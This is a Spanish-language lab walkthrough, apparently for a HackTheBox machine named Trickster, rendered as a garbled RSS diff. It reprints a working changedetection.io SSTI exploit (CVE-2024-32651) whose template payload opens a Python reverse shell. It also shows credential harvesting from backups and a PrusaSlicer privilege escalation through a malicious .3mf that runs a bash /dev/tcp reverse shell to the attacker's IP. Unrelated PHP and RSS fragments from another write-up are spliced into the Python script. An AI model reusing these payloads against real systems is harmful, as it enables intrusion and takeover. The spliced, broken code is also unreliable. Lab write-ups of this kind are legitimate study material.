+<img alt="Pasted image 20250214113934.png" src="machines/trickster/imgs/pasted-image-20250214113934.png"><br><br>Investigando sobre la version de changedetection.io ; vemos que la version es vulnerable a la un SSTI en la version actual <br>Un SSTI (Server-Side Template Injection) es una vulnerabilidad de seguridad que permite a un atacante inyectar y ejecutar código en la plantilla de una aplicación del lado del servidor, aprovechando malas prácticas en el procesamiento de datos dinámicos. Esto puede llevar a la ejecución remota de código, acceso no autorizado o robo de datos sensibles. Ocurre cuando la aplicación inserta entradas de usuario sin sanitizar en templates que son procesados por el servidor.<br>Para mas informacion sobre ataques SSTI podemos visitar la pagina de <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/server-side-template-injection" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger</a><br>Esta vulnerabilidad de changedetection.io esta documentada en el <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" target="_blank">CVE-2024-32651</a><br><br>Buscamos en github y hay un PoC que automatiza el proceso del SSTI ; pongo el codigo y lo analizamos;<br>Al siguiente script debemos pasarle las siguientes variables<br>
+<br>--url: URL base del sitio vulnerable (Nuestro caso: http://localhost:5000).
+<br>--port: Puerto en el que el atacante escuchará la conexión inversa 
+<br>--ip: Dirección IP del atacante para recibir la conexión inversa. (Nuestra interfaz tun0)
+<br>--notification: URL de notificación personalizada (opcional).
+<br># Exploit Title: changedetection &lt;= 0.45.20 Remote Code Execution (RCE)
+# Date: 5-26-2024
+# Exploit Author: Zach Crosman (zcrosman)
+# Vendor Homepage: changedetection.io
+# Software Link: https://github.com/dgtlmoon/changedetection.io
+# Version: &lt;= 0.45.20
+# Tested on: Linux
+# CVE : CVE-2024-32651
 
-if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
-    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
+from pwn import *
+import requests
+from bs4 import BeautifulSoup
+import argparse
+
+def start_listener(port):
+    listener = listen(port)
+    print(f"Listening on port {port}...")
+    conn = listener.wait_for_connection()
+    print("Connection received!")
+    context.newline = b'\r\n'
+    # Switch to interactive mode
+    conn.interactive()
+
+def add_detection(url, listen_ip, listen_port, notification_url=''):
+    session = requests.Session()
     
-    header('WWW-Authenticate: Basic realm="Employee Management"');
-    header('HTTP/1.0 401 Unauthorized');
-    exit;
-}
+    # First request to get CSRF token
+    request1_headers = {
+        "Cache-Control": "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "close"
+    }
 
-header('Location: dashboard.php');
-exit;
-base64: invalid input
-➜  Cat 
-<br>Bueno pues resulta que las creds de admin es la password de root:<br>
-<img alt="Pasted image 20250211105458.png" src="machines/cat/imgs/pasted-image-20250211105458.png">]]></description><link>machines/cat/2-privesc.html</link><guid isPermaLink="false">Machines/Cat/2 -PrivEsc.md</guid><pubDate>Tue, 11 Feb 2025 09:55:00 GMT</pubDate><enclosure url="machines/cat/imgs/pasted-image-20250210154828.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/cat/imgs/pasted-image-20250210154828.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
+    response = session.get(url, headers=request1_headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
+    print(f'Obtained CSRF token: {csrf_token}')
+
+    # Second request to submit the form and get the redirect URL
+    add_url = f"{url}/form/add/quickwatch"
+    add_url_headers = {  # Define add_url_headers here
+        "Origin": url,
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    add_url_data = {
+        "csrf_token": csrf_token,
+        "url": "https://reddit.com/r/baseball",
+        "tags": '',
+        "edit_and_watch_submit_button": "Edit &gt; Watch",
+        "processor": "text_json_diff"
+    }
+
+    post_response = session.post(add_url, headers=add_url_headers, data=add_url_data, allow_redirects=False)
+
+    # Extract the URL from the Location header
+    if 'Location' in post_response.headers:
+        redirect_url = post_response.headers['Location']
+        print(f'Redirect URL: {redirect_url}')
+    else:
+        print('No redirect URL found')
+        return
+
+    # Third request to add the changedetection url with ssti in notification config
+    save_detection_url = f"{url}{redirect_url}"
+    save_detection_headers = {  # Define save_detection_headers here
+        "Referer": redirect_url,
+        "Cookie": f"session={session.cookies.get('session')}"
+    }
+
+    save_detection_data = {
+        "csrf_token": csrf_token,
+        "url": "https://reddit.com/r/all",
+        "title": '',
+        "tags": '',
+        "time_between_check-weeks": '',
+        "time_between_check-days": '',
+        "time_between_check-hours": '',
+        "time_between_check-minutes": '',
+        "time_between_check-seconds": '30',
+        "filter_failure_notification_send": 'y',
+        "fetch_backend": 'system',
+        "webdriver_delay": '',
+        "webdriver_js_execute_code": '',
+        "method": 'GET',
+        "headers": '',
+        "body": '',
+        "notification_urls": notification_url,
+        "notification_title": '',
+        "notification_body": f"""
+        {{% for x in ().__class__.__base__.__subclasses__() %}}
+        {{% if "warning" in x.__name__ %}}
+        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen_ip}\\",{listen_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
+        {{% endif %}}
+        {{% endfor %}}
+        """,
+        "notification_format": 'System default',
+        "include_filters": '',
+        "subtractive_selectors": '',
+        "filter_text_added": 'y',
+        "filter_text_replaced": 'y',
+        "filter_text_removed": 'y',
+        "trigger_text": '',
+        "ignore_text": '',
+        "text_should_not_be_present": '',
+        "extract_text": '',
+        "save_button": 'Save'
+    }
+    final_response = session.post(save_detection_url, headers=save_detection_headers, data=save_detection_data)
+
+    print('Final request made.')
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Add detection and start listener')
+    parser.add_argument('--url', type=str, required=True, help='Base URL of the target site')
+    parser.add_argument('--port', type=int, help='Port for the listener', default=4444)
+    parser.add_argument('--ip', type=str, required=True, help='IP address for the listener')
+    parser.add_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
+    args = parser.parse_args()
+
+
+    add_detection(args.url, args.ip, args.port, args.notification)
+    start_listener(args.port)
+<br>
+<br>Configuración del Listener:
+
+<br>Inicia un listener en un puerto especificado para recibir una conexión inversa desde el servidor vulnerable.
+
+
+<br>Obtención del Token CSRF:
+
+<br>Realiza una solicitud GET al sitio objetivo para obtener un token CSRF necesario para realizar solicitudes autenticadas.
+
+
+<br>Creación de una Nueva Detección:
+
+<br>Envía una solicitud POST para agregar una nueva URL a monitorear en la aplicación.
+<br>Utiliza este proceso para obtener una URL de redirección que permite editar la configuración de la detección.
+
+
+<br>Inyección de Código Malicioso:
+
+<br>En la configuración de notificaciones de la nueva detección, inserta un payload SSTI que:
+
+<br>Itera sobre las clases base del sistema Python.
+<br>Busca una clase con "warning" en su nombre.
+<br>Utiliza esta clase para importar y ejecutar comandos del sistema operativo.
+<br>Ejecuta un comando que establece una conexión inversa al IP y puerto del atacante usando python3 y bash.
+
+
+
+
+<br>Envío del Payload:
+
+<br>Guarda la configuración maliciosa enviando otra solicitud POST.
+<br>Esto activa el payload SSTI en el servidor vulnerable.
+
+
+<br>Recepción de la Conexión Inversa:
+
+<br>El servidor vulnerable ejecuta el código inyectado, conectándose al listener del atacante.
+<br>El atacante obtiene acceso interactivo a la shell del servidor.
+
+
+<br>El script no funciona, pruebo a reproducirlo paso a paso anadiendo debugs<br>Y es que el endpoint /login?next=/ Nos devuelve un 500 INTERNAL SERVER ERROR<br>
+<img alt="Pasted image 20250214124302.png" src="machines/trickster/imgs/pasted-image-20250214124302.png"><br>Pruebo a logearme con las credenciales de james alwaysandforever<br>
+Y entramos;<br>
+<img alt="Pasted image 20250214125118.png" src="machines/trickster/imgs/pasted-image-20250214125118.png"><br>Si pulsamos en backup nos decarga un comprimido; vamos a echarle un vistazo;<br>➜  backdump ls
+b86f1003-3ecb-4125-b090-27e15ca605b9  changedetection-backup-20250214115130.zip  url-list-with-tags.txt  url-watches.json
+bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt                                 url-list.txt
+➜  backdump tree b86f1003-3ecb-4125-b090-27e15ca605b9 
+b86f1003-3ecb-4125-b090-27e15ca605b9
+|-- 3855b43e05c02a09c0b63be14f70a8bb.txt.br
+|-- 7fa5d9292139604c79d87fb69f21ffe2.txt.br
+|-- ce6278706b3912f01bf5355004eb538a.txt.br
+|-- cf0c62552e4672c2326c0ef0489883c8.txt.br
+|-- d589415eb5dbd392fa8874829ce30450.txt.br
+|-- dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
+`-- history.txt
+
+1 directory, 7 files
+➜  backdump cat b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt 
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 1725049268,dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
+   2   │ 1725093859,7fa5d9292139604c79d87fb69f21ffe2.txt.br
+   3   │ 1725955071,d589415eb5dbd392fa8874829ce30450.txt.br
+   4   │ 1726233055,cf0c62552e4672c2326c0ef0489883c8.txt.br
+   5   │ 1726596196,ce6278706b3912f01bf5355004eb538a.txt.br
+   6   │ 1726746285,3855b43e05c02a09c0b63be14f70a8bb.txt.br
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+➜  backdump cat url-list.txt 
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: url-list.txt
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ https://news.ycombinator.com/
+   2   │ https://changedetection.io/CHANGELOG.txt
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+➜  backdump cat secret.txt 
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: secret.txt
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5
+
+<br><br>En el exploit de Python anterior, vimos la existencia de una flag llamada “–notification”, identificamos en el pie del campo “Notification Body” que usa Jinja2, esto nos permite ejecutar ataques de tipo SSTI (Server-Side Template Injection), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 80 y pulsamos en “Send test notification”:<br>Recibimos conexion con el servidor mandando una peticion por notification<br>
+<img alt="Pasted image 20250214130533.png" src="machines/trickster/imgs/pasted-image-20250214130533.png"><br>
+Ahora tenemos que inyectar la rev shell del script en el campo notifications; y somos root en el container<br><img alt="Pasted image 20250214130827.png" src="machines/trickster/imgs/pasted-image-20250214130827.png"><br>Encuentro el directorio /datastore/Backups dentro del container; no tenemos ni nc ni wget pero si python entonces puedo lanzat un servidor http y hacer otro puente ssh hacia el puerto<br>root@a4b9a36ae7ff:/datastore/Backups# python -m http.server 2000
+Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:20
+<br><img alt="Pasted image 20250214131310.png" src="machines/trickster/imgs/pasted-image-20250214131310.png"><br>Dentro de los backups encontramos estos archivos .br;<br><img alt="Pasted image 20250214174849.png" src="machines/trickster/imgs/pasted-image-20250214174849.png"><br>Lo descomprimimos con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/google/brotli" rel="noopener nofollow" class="external-link" href="https://github.com/google/brotli" target="_blank">brotli</a> ; <br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 l
+total 16K
+drwxrwxr-x 2 kali kali 4,0K ago 31 10:50 .
+drwxrwxr-x 3 kali kali 4,0K feb 14 13:14 ..
+-rw-r--r-- 1 kali kali 2,6K ago 31 01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
+-rw-r--r-- 1 kali kali   51 ago 31 01:47 history.txt
+➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
+➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ls
+f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
+
+<br>en el archivo de texto encontramos la password del usuario Adam<br>
+<img alt="Pasted image 20250214175709.png" src="machines/trickster/imgs/pasted-image-20250214175709.png"><br><br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 cat --plain f04f0732f120c0cc84a993ad99decb2c.txt | grep password
+                'database_password' =&gt; 'adam_admin992' ,                                                                                                               
+                'mailer_password' =&gt; NULL ,                                                                                                                            
+➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ssh adam@trickster.htb
+adam@trickster.htb's password: 
+adam@trickster:~$ id
+uid=1002(adam) gid=1002(adam) groups=1002(adam)
+adam@trickster:~$ whoami
+adam
+adam@trickster:~$ 
+<br>Adam puede usar sudo en :<br>adam@trickster:~$ sudo -l
+Matching Defaults entries for adam on trickster:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User adam may run the following commands on trickster:
+    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
+<br>El binario no aparece en GTFObins; una busqueda en google me indica que igual es un binario relacionado con la gestion de impresoras 3D;<br>
+<img alt="Pasted image 20250214181500.png" src="machines/trickster/imgs/pasted-image-20250214181500.png"><br>Le realizamos un string <br>adam@trickster:~$ strings /opt/PrusaSlicer/prusaslicer | grep print
+sprintf
+fprintf
+appimage_print_binary
+appimage_print_hex
+print_help
+  --appimage-mount                Mount embedded filesystem image and print
+
+<br>adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
+DISPLAY not set, GUI mode not available.
+
+PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
+https://github.com/prusa3d/PrusaSlicer
+
+Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]
+
+Actions:
+ --export-3mf        Export the model(s) as 3MF.
+ --export-amf        Export the model(s) as AMF.
+ --export-gcode, --gcode, -g
+                     Slice the model and export toolpaths as G-code.
+ --export-obj        Export the model(s) as OBJ.
+ --export-sla, --sla Slice the model and export SLA printing layers as PNG.
+ --export-stl        Export the model(s) as STL.
+ --gcodeviewer       Visualize an already sliced and saved G-code
+ --help, -h          Show this help.
+ --help-fff          Show the full list of print/G-code configuration options.
+ --help-sla          Show the full list of SLA print configuration options.
+ --info              Write information about the model to the console.
+ --opengl-debug      Activate OpenGL debug output on graphic cards which support it
+ --opengl-version ABCD
+                     Select a specific version of OpenGL
+ --save ABCD         Save configuration to the specified file.
+ --slice, -s         Slice the model as FFF or SLA based on the printer_technology configuration
+                     value.
+
+Transform options:
+ --align-xy X,Y      Align the model to the given point.
+ --center X,Y        Center the print around the given center.
+ --cut N             Cut model at the given Z.
+ --delete-after-load ABCD
+                     Delete files after loading.
+ --dont-arrange      Do not rearrange the given models before merging and keep their original XY
+                     coordinates.
+ --duplicate N       Multiply copies by this factor.
+ --duplicate-grid X,Y
+                     Multiply copies by creating a grid.
+ --ensure-on-bed     Lift the object above the bed when it is partially below. Enabled by default,
+                     use --no-ensure-on-bed to disable.
+ --merge, -m         Arrange the supplied models in a plate and merge them in a single model in order
+                     to perform actions once.
+ --repair            Try to repair any non-manifold meshes (this option is implicitly added whenever
+                     we need to slice the model to perform the requested action).
+ --rotate N          Rotation angle around the Z axis in degrees.
+ --rotate-x N        Rotation angle around the X axis in degrees.
+ --rotate-y N        Rotation angle around the Y axis in degrees.
+ --scale N           Scaling factor or percentage.
+ --scale-to-fit X,Y,Z
+                     Scale to fit the given volume.
+ --split             Detect unconnected parts in the given model(s) and split them into separate
+                     objects.
+
+Other options:
+ --config-compatibility
+                     This version of PrusaSlicer may not understand configurations produced by the
+                     newest PrusaSlicer versions. For example, newer PrusaSlicer may extend the list
+                     of supported firmware flavors. One may decide to bail out or to substitute an
+                     unknown value with a default silently or verbosely. (disable, enable,
+                     enable_silent; default: enable)
+ --datadir ABCD      Load and store settings at the given directory. This is useful for maintaining
+                     different profiles or including configurations from a network storage.
+ --ignore-nonexistent-config
+                     Do not fail if a file supplied to --load does not exist.
+ --load ABCD         Load configuration from the specified file. It can be used more than once to
+                     load options from multiple files.
+ --loglevel N        Sets logging sensitivity. 0:fatal, 1:error, 2:warning, 3:info, 4:debug, 5:trace
+                     For example. loglevel=2 logs fatal, error and warning level messages.
+ --output ABCD, -o ABCD
+                     The file where the output will be written (if not specified, it will be based on
+                     the input file).
+ --single-instance   If enabled, the command line arguments are sent to an existing instance of GUI
+                     PrusaSlicer, or an existing PrusaSlicer window is activated. Overrides the
+                     "single_instance" configuration value from application preferences.
+
+Print options are processed in the following order:
+  1) Config keys from the command line, for example --fill-pattern=stars
+     (highest priority, overwrites everything below)
+  2) Config files loaded with --load
+  3) Config values loaded from amf or 3mf files
+
+Run --help-fff / --help-sla to see the full listing of print options.
+
+<br>La version del programa es vulnerable ; (PrusaSlicer-2.6.1)<br>
+Vemos que se puede ejecutar código arbitrario observando la versión del programa en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a><br><br>Segun <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a>:<br>For the linux PoC, this CLI command is enough to execute the payload contained in the project. './prusa-slicer -s code-exec-linux.3mf'. After slicing, a new file '/tmp/hax' will be created. This particular PoC contains this 'post_process' entry in the 'Slic3r_PE.config' file:  
+<br>El exploit  permite la ejecución de código arbitrario al manipular el archivo Slic3r_PE.config dentro de un proyecto .3mf de PrusaSlicer.<br>El archivo Slic3r_PE.config es donde se define la configuración del proyecto y contiene la entrada post_process, que se utiliza para ejecutar scripts después de generar el archivo G-code. En este caso, modificaremos esta entrada para incluir nuestro payload .<br>Slic3r_PE.config:<br>; post_process = "/usr/bin/id &gt; /tmp/hax #\necho 'arbitrary code execution! (x_x)'&gt;&gt; /tmp/hax #"
+<br><br>En el siguiente repositorio de github ya tenemos un archivo .3mf malicioso<br>
+<a rel="noopener nofollow" class="external-link" href="https://github.com/suce0155/prusaslicer_exploit.git" target="_blank">https://github.com/suce0155/prusaslicer_exploit.git</a><br>Lo descomprimimos y observamos el arbol de directorio de los archivos .3mf y como este ejecuta el codigo arbitrario;<br>Para extraerlo usamos unzip o 7z cualquiera vale;<br>total 64K
+drwxrwxr-x 4 kali kali 4,0K feb 14 20:00 .
+drwxrwxr-x 6 kali kali 4,0K feb 14 19:52 ..
+-rw-rw-r-- 1 kali kali  39K feb 14 19:52 evil.3mf
+-rw-rw-r-- 1 kali kali   42 feb 14 19:52 exploit.sh
+drwxrwxr-x 5 kali kali 4,0K feb 14 20:00 Extracted
+drwxrwxr-x 8 kali kali 4,0K feb 14 19:52 .git
+-rw-rw-r-- 1 kali kali  369 feb 14 19:52 README.md
+➜  prusaslicer_exploit git:(main) ✗ tree Extracted 
+Extracted
+├── 3D
+│   └── 3dmodel.model
+├── [Content_Types].xml
+├── Metadata
+│   ├── Slic3r_PE.config
+│   ├── Slic3r_PE_model.config
+│   └── thumbnail.png
+└── _rels
+
+4 directories, 5 files
+
+<br>El exploit esta en el archivo Slic3r_PE.config que es el que ejecuta codigo arbitrario<br> cat Extracted/Metadata/Slic3r_PE.config | grep tmp
+; post_process = "chmod +x /tmp/exploit.sh";"bash /tmp/exploit.sh"
+<br>El exploit le da permiso a un archivo /tmp/exploit.sh y lo ejecuta con bash<br>Modificamos exploit.sh y lo movemos a /tmp<br>adam@trickster:~/prusaslicer_exploit$ cat /tmp/exploit.sh 
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.232/2323 0&gt;&amp;1
+<br><br><img alt="Pasted image 20250215133235.png" src="machines/trickster/imgs/pasted-image-20250215133235.png">]]></description><link>machines/trickster/2.privesc.html</link><guid isPermaLink="false">Machines/Trickster/2.PrivEsc.md</guid><pubDate>Sat, 15 Feb 2025 12:37:35 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250213163524.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250213163524.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
